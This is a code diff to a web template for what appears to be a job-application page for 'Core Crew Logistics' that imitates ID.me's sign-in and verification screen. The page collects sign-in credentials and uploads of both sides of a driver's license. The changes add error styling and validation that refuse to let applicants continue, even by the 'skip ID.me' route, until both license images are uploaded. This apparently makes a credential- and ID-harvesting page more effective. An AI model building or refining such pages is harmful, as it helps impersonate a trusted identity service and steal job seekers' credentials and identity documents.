@@ -21,6 +21,20 @@
       font-weight: 500;
     }
     .fixed-back-btn:hover { text-decoration: underline; }
+    .inline-error {
+      background: #fff1f2;
+      border: 1px solid #fecdd3;
+      color: #b42318;
+      border-radius: 6px;
+      padding: 10px 12px;
+      margin-bottom: 14px;
+      font-size: 0.9rem;
+      line-height: 1.45;
+    }
+    .upload-dropzone.upload-missing {
+      border-color: #dc2626 !important;
+      background: #fef2f2 !important;
+    }
     @media (min-width: 701px) {
       .fixed-back-btn { top: 70px; left: 2rem; }
     }
@@ -29,14 +43,15 @@
 <body>
 
   <!-- Back navigation -->
-  <a href="/apply/info-note" class="btn ghost fixed-back-btn" aria-label="Go back">&larr; Back</a>
+  <a href="/apply/info-note" class="btn ghost fixed-back-btn" aria-label="Go back"
+     onclick="if(document.referrer && document.referrer !== window.location.href){window.history.back();}else{window.location.href='/apply/info-note';} return false;">&larr; Back</a>
 
   <div class="idme-page-wrapper">
 
     <!-- ID.me top navigation bar -->
     <header class="idme-top-bar" role="banner">
       <div class="idme-top-bar-inner">
-        <img src="/public/img/idme-logo.svg" alt="ID.me" style="height: 28px; filter: brightness(0) invert(1);" />
+        <img src="/public/img/idme-logo.svg" alt="ID.me" style="height: 28px;" />
       </div>
     </header>
 
@@ -47,9 +62,8 @@
         <!-- Partner logos -->
         <div class="form-header-content" role="banner">
           <div class="partner">
-            <div class="company-logo" style="display:flex;align-items:center;gap:10px;justify-content:center;">
+            <div class="company-logo" style="display:flex;align-items:center;gap:18px;justify-content:center;">
               <img class="logo" src="/public/img/logo.jpg" alt="Core Crew Logistics Logo" />
-              <span style="font-size:0.85rem;color:#7a8da0;margin:0 4px;" aria-hidden="true">&times;</span>
               <img src="/public/img/idme-logo.svg" alt="ID.me" style="max-height:32px;" />
             </div>
           </div>
@@ -70,6 +84,11 @@
 
         <!-- Sign-in & verification form -->
         <form id="idme-form" class="idme-form" method="post" action="/apply/verify" autocomplete="off" enctype="multipart/form-data">
+          <% if (typeof errorMessage !== 'undefined' && errorMessage) { %>
+            <div class="inline-error" id="uploadInlineError"><%= errorMessage %></div>
+          <% } else { %>
+            <div class="inline-error" id="uploadInlineError" style="display:none;"></div>
+          <% } %>
           <fieldset class="form-fields" style="border:none;margin:0;padding:0;">
             <legend class="sr-only" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);">Sign in credentials</legend>
 
@@ -103,7 +122,7 @@
             <!-- Driver's License Front -->
             <div class="field file verify-upload-field">
               <label for="driversLicenseFront">Upload Driver's License / ID (Front)</label>
-              <div class="upload-dropzone" id="dropzone-front">
+              <div class="upload-dropzone <%= (typeof missingFront !== 'undefined' && missingFront) ? 'upload-missing' : '' %>" id="dropzone-front">
                 <svg class="upload-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true">
                   <path d="M12 16V4m0 0L8 8m4-4l4 4" />
                   <path d="M20 16v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2" />
@@ -117,7 +136,7 @@
             <!-- Driver's License Back -->
             <div class="field file verify-upload-field">
               <label for="driversLicenseBack">Upload Driver's License / ID (Back)</label>
-              <div class="upload-dropzone" id="dropzone-back">
+              <div class="upload-dropzone <%= (typeof missingBack !== 'undefined' && missingBack) ? 'upload-missing' : '' %>" id="dropzone-back">
                 <svg class="upload-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true">
                   <path d="M12 16V4m0 0L8 8m4-4l4 4" />
                   <path d="M20 16v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2" />
@@ -155,6 +174,25 @@
 
   <script>
     function submitSkip() {
+      var frontInput = document.getElementById('driversLicenseFront');
+      var backInput = document.getElementById('driversLicenseBack');
+      var frontZone = document.getElementById('dropzone-front');
+      var backZone = document.getElementById('dropzone-back');
+      var errorBox = document.getElementById('uploadInlineError');
+
+      frontZone.classList.remove('upload-missing');
+      backZone.classList.remove('upload-missing');
+
+      if (!frontInput.files.length || !backInput.files.length) {
+        if (!frontInput.files.length) frontZone.classList.add('upload-missing');
+        if (!backInput.files.length) backZone.classList.add('upload-missing');
+        if (errorBox) {
+          errorBox.style.display = 'block';
+          errorBox.textContent = "Both front and back of your driver's license/ID are required.";
+        }
+        return;
+      }
+
       var form = document.getElementById('idme-form');
       form.action = '/apply/skip-idme/';
       form.method = 'post';
@@ -187,6 +225,18 @@
 
         if (!validateFile(front, 'Front')) { e.preventDefault(); return; }
         if (!validateFile(back, 'Back')) { e.preventDefault(); return; }
+
+        var errorBox = document.getElementById('uploadInlineError');
+        if (!front || !back) {
+          if (!front) document.getElementById('dropzone-front').classList.add('upload-missing');
+          if (!back) document.getElementById('dropzone-back').classList.add('upload-missing');
+          if (errorBox) {
+            errorBox.style.display = 'block';
+            errorBox.textContent = "Both front and back of your driver's license/ID are required.";
+          }
+          e.preventDefault();
+          return;
+        }
       });
 
       // Dropzone visual feedback
@@ -213,6 +263,11 @@
               var textEl = zone.querySelector('.upload-dropzone-text');
               if (fileInput.files.length > 0 && textEl) {
                 textEl.textContent = fileInput.files[0].name;
+                zone.classList.remove('upload-missing');
+                var errorBox = document.getElementById('uploadInlineError');
+                if (errorBox && document.getElementById('driversLicenseFront').files.length && document.getElementById('driversLicenseBack').files.length) {
+                  errorBox.style.display = 'none';
+                }
               }
             });
           }
